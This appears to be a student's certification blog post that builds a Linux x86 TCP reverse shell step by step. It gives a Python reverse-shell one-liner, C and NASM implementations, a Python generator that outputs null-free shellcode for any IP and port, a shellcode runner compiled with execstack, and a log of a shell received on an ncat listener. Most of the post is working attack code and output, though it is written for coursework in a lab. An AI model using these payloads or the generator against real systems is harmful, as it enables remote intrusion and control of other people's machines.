Title: SLAE32 - Assignment 2
Date: 2022-06-04T07:44:56.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2">rbctee/SlaeExam</a>.</p><!--kg-card-begin: markdown--><p>List of files:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.c">tcp_rev_shell.c</a>: Reverse Shell written in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.nasm">tcp_rev_shell.nasm</a>: Reverse Shell written in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/wrapper.py">automation/wrapper.py</a>: <code>python</code> script to automate the generation of shellcode based on arbitrary IP addresses and TCP port</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/template.nasm">automation/template.nasm</a>: generic template used by <code>wrapper.py</code></li>
</ul>
<!--kg-card-end: markdown--><h2 id="implementation">Implementation</h2><p>Follows the visual representation of this technique:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-2.png" class="kg-image" alt="How a TCP Reverse Shell works" loading="lazy" width="273" height="334"><figcaption><em>How a TCP Reverse Shell works</em></figcaption></figure><p>After creating a TCP socket, it connects to a specific TCP listener, identified by an <code>IP:PORT</code> pair.</p><p>At that point, the program redirects input, output and error to the newly-created socket. Finally, a shell is spawned, thus giving an interactive shell to the TCP listener the socket connected to.</p><p>The graph is based on the C code I wrote in the next chapter.</p><h3 id="c-code">C Code</h3><p>Given that I didn't know how to write a Reverse Shell in C, first I looked for a simple one-liner in <code>python</code> (which is the closest language I'm familiar with):</p><pre><code class="language-bash">python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</code></pre><p>Let's analyze the instructions:</p><pre><code class="language-py">import socket, os, pty

s = socket.socket()
s.connect(("127.0.0.1", 4444))

# s.fileno() returns the File Descriptor associated with the socket
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

pty.spawn("/bin/sh")</code></pre><p>First, it creates a TCP <code>socket</code> and connects it to <code>127.0.0.1:4444</code>. After that, it uses the function <code>dup2</code> in order to redirect <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> towards the socket.</p><p>Finally, it executes <code>/bin/sh</code>. Let's see if my C version works:</p><pre><code class="language-cpp">#include &lt;netinet/ip.h&gt;

int main() {
    int client_socket_fd;

    // define an array made up of 1 value: 0
    // this way I don't have to pass NULL pointers to execve
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    // create a TCP socket
    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // connect to 127.0.0.1:4444
    // where netcat is listening
    // /bin/sh -c "nc -v -l 4444"
    client_address.sin_family = AF_INET;

    // convert the IP address to an 'in_addr' struct
    inet_aton("127.0.0.1", &amp;client_address.sin_addr);
    client_address.sin_port = htons(4444);

    // connect to the socket
    connect(client_socket_fd, (struct sockaddr *)&amp;client_address, sizeof(client_address));

    // redirect stdin/stdout/stderr to the socket
    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    // now that the standard file descriptors are redirected
    // once we spawn /bin/sh, input/output/error are going to be bound
    //      to the socket
    execve("/bin/sh", empty, empty);
}</code></pre><p>The first part is similar to the previous assignment: it creates a TCP socket using the same arguments.</p><p>However, compared to the function <code>bind()</code>, <code>connect()</code> doesn't use the value <code>INADDR_ANY</code>. Instead, it uses a specific IP address to connect to.</p><p>I discovered that you can't just do the following:</p><pre><code class="language-cpp">client_address.sin_addr.s_addr = "127.0.0.1";</code></pre><p>The reason resides in the definition of <a href="https://man7.org/linux/man-pages/man7/ip.7.html">sockaddr_in</a>:</p><pre><code class="language-cpp">struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};</code></pre><!--kg-card-begin: markdown--><p>The variable <code>sin_addr</code> isn't simply a string (or a <code>char</code> array): it's an <code>in_addr</code> struct, so we need to convert the string first.</p>
<p>According to <a href="https://web.archive.org/web/20201128162706/https://www.gta.ufrj.br/ensino/eel878/sockets/inet_ntoaman.html">this website</a>, there are two options:</p>
<ul>
<li><code>inet_addr</code>, an old function and theorically deprecated</li>
<li><code>inet_aton</code>, which is the recommended way</li>
</ul>
<p>After that:</p>
<ul>
<li>the function <code>connect()</code> is used for connecting the newly-created socket to <code>127.0.0.1:4444</code> (a netcat listener running on the same machine)</li>
<li>input/output/error is redirected to the socket through the use of the <code>dup2</code> function.</li>
</ul>
<p>Lastly, the syscall <code>execve</code> spawns an <code>SH</code> shell.</p>
<p>Here's what's different from my first attempt at the <code>Bind Shell TCP Shellcode</code>: it seems you don't need to manage the reception of commands and their execution, like I did previously (in the first assignment) using the functions <code>recv</code>, and <code>system</code>.</p>
<p>In fact, after you correctly redirect input/output/error to the remote socket, and spawn a shell, everything else is performed automatically by the system.</p>
<!--kg-card-end: markdown--><h3 id="assembly">Assembly</h3><p>Follows the first piece of code we need to convert into Assembly code:</p><pre><code class="language-cpp">int main() {
    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
</code></pre><p>As for the 1st assignment, a socket can be created by means of the <code>socketcall</code> system function:</p><pre><code class="language-nasm">; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; clear EAX, EBX, and ECX registers
    xor eax, eax
    mov ebx, eax
    mov ecx, eax

    ; copy 102 into EAX: socketcall() syscall
    mov al, 102

    ; 3rd argument of socket(): IPPROTO_TCP (0x6)
    mov cl, 6
    push ecx

    ; 1st argument of socketcall(): SYS_SOCKET
    ; 2nd argument of socket(): SOCK_STREAM (0x00000001)
    inc bl
    push ebx

    ; 1st argument of socket(): AF_INET
    mov cl, 2
    push ecx

    ; 2nd argument of socketcall(): pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80

    ; save server socket file descriptor
    mov esi, eax</code></pre><p>As you can see, the syscall <code>socketcall</code> (n. 102, or <code>0x66</code>) calls <code>socket()</code>, to which the parameters <code>AF_INET</code>, <code>SOCK_STREAM</code>, <code>IPPROTO_TCP</code> are passed in order to create a TCP socket.</p><p>Once the socket has been created, we need to connect it to the remote server, in this case the netcat listener:</p><pre><code class="language-cpp">    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &amp;client_address.sin_addr);
    client_address.sin_port = htons(4444);

    connect(
        client_socket_fd,
        (struct sockaddr *)&amp;client_address,
        sizeof(client_address)
    );</code></pre><p>First <em>hurdle</em> is the <code>sockaddr_in</code> struct, which I've already covered in the 1st assignment:</p><pre><code class="language-cpp">struct sockaddr_in {
  unsigned short      sin_family;
  unsigned short      sin_port;
  struct in_addr      sin_addr;
};

struct in_addr sin_addr {
  unsigned int        s_addr;
}</code></pre><p>The size of the struct <code>sockaddr_in</code> is <code>0x10</code> bytes (due to padding). Follows the assembly code regarding the creation of the aforementioned struct, and the <code>connect</code> function:</p><pre><code class="language-nasm">    ; inet_aton("127.0.0.1")
    ;rol ebx, 24
    ;push ebx
    push 0x0100007f
    ;mov [esp], BYTE 127
    
    ; 0x115c -&gt; htons(4444)
    push WORD 0x5c11

    ; 0x0002 -&gt; AF_INET
    mov bl, 2
    push WORD bx

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of connect(): size of the struct
    ; push 16
    xor ebx, ebx
    mov bl, 16
    push ebx

    ; 2nd argument of connect(): pointer to the struct
    push ecx

    ; 1st argument of connect(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall()
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_CONNECT
    mov bl, 3

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80</code></pre><p>Next, we're ready to redirect <code>stdin</code>/<code>stdout</code>/<code>stderr</code> towards the server socket.</p><pre><code class="language-nasm">    ; loop counter (repeats dup2() three times)
    mov ecx, ebx

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov al, 63

    ; Client file descriptor
    mov ebx, esi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate</code></pre><p>As for the previous assignment, the <code>loop</code> instruction repeats the routine <code>RepeatDuplicate</code> three times, once for <code>stderr</code> (<code>0x2</code>), <code>stdout</code> (<code>0x1</code>), and for <code>stdin</code> (<code>0x0</code>):</p><p>Finally, it spawns a shell:</p><pre><code class="language-nasm">    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    ; execve syscall
    xor eax, eax
    mov al, 11
    int 0x80</code></pre><p>From now on, every message that will be sent from the netcat listener is going to be interpreted as a command, since the file descriptors of the <code>shell</code> are redirected to those of the <code>socket</code>.</p><h2 id="automation">Automation</h2><p>One of the requirements of the assignment is to be able to easily configure <code>IP address</code> and <code>TCP port</code>. For this reason, I chose to reuse the script I wrote for the first assignment, to which I've made some small changes in order to use arbitrary IP addresses too.</p><p>I won't show the whole script again, as I've already done that. I'll only cover the changes.</p><p>First, there's the <code>main</code> function. I've added another argument to the script, named <code>ip</code>:</p><pre><code class="language-py">def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-ip', "--ip", help="IP address of the Bind Shell", required=True)
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    ip_address = args.ip
    tcp_port = args.port

    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, ip_address, output_file_path)
    generate_shellcode(output_file_path)</code></pre><p>Other than that, I have changed the function <code>replace_template_values()</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">def replace_template_values(template_name, tcp_port, ip_address, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)

    ip_address_bytes = [int(x) for x in ip_address.split(".")][::-1]
    
    if 0 in ip_address_bytes:
        print("[!] Found NULL byte in IP address")

        # choose a random byte from the range(1,256), excluding the bytes that make up the IP address
        random_xor_byte = random.choice(list(set(range(1,256)) - set(ip_address_bytes)))

        # encode XORing DWORD and XORed DWORD to hexadecimal
        xor_dword = (bytes([random_xor_byte]) * 4).hex()
        ip_address_xored_bytes = bytes([x ^ random_xor_byte for x in ip_address_bytes]).hex()
        
        replace_code = f"mov ebx, 0x{ip_address_xored_bytes}\n    xor ebx, 0x{xor_dword}\n    push ebx\n    xor ebx, ebx"</code></pre><figcaption>The function also checks for <code>NULL</code> bytes inside the IP address, <code>XOR</code>-ing the values with a random byte in case there are</figcaption></figure><pre><code class="language-py">    else:
        ip_address_hex = "".join([(x).to_bytes(1, "little").hex() for x in ip_address_bytes])
        replace_code = f"push 0x{ip_address_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_IP }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)</code></pre><p>When you run the script it shows you the required arguments:</p><pre><code class="language-bash">python3 script.py -h

# usage: wrapper.py [-h] -p [1-65535] -ip IP -t TEMPLATE -o OUTPUT

# optional arguments:
#   -h, --help            show this help message and exit
#   -p [1-65535], --port [1-65535]
#                         TCP Port of the Bind Shell
#   -ip IP, --ip IP       IP address of the Bind Shell
#   -t TEMPLATE, --template TEMPLATE
#                         Path of the NASM template file. Example: -t /tmp/template.nasm
#   -o OUTPUT, --output OUTPUT
#                         Path of the output file. Example: -o /tmp/output.nasm</code></pre><p>If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner.</p><p>Follows an example:</p><pre><code class="language-bash">python3 wrapper.py -p 1234 -ip "127.0.0.1" -t ./template.nasm -o /tmp/output.nasm

# [!] Found NULL byte in IP address
# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 99 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\xbb\xa0\xdf\xdf\xde\x81\xf3\xdf\xdf\xdf\xdf\x53\x31\xdb\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";</code></pre><p>The python script and the <code>NASM</code> template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2/automation">assignment/2/automation</a>.</p><h2 id="testing">Testing</h2><p>To test that everything works correctly, I used the python script to generate the shellcode for a TCP Reverse Shell listening on <code>192.168.1.107:256</code>:</p><pre><code class="language-bash">python3 wrapper.py -p 256 -ip "192.168.1.107" -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 92 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
</code></pre><p>To test the shellcode generated by the python script, I used the following C <code>shellcode runner</code>:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \
"\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}</code></pre><p>Compile and run it:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack shellcode_runner.c -o /tmp/tcp_rev_shell
/tmp/tcp_rev_shell</code></pre><p>On my Kali machine, on which I previously set up a ncat listener (<code>sudo ncat -nvlp 256</code>), I received a reverse shell:</p><pre><code class="language-bash">sudo nc -nvlp 256

# Ncat: Listening on :::256
# Ncat: Listening on 0.0.0.0:256
# Ncat: Connection from 192.168.1.105.
# Ncat: Connection from 192.168.1.105:60058.
# id
# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
# whoami
# rbct</code></pre>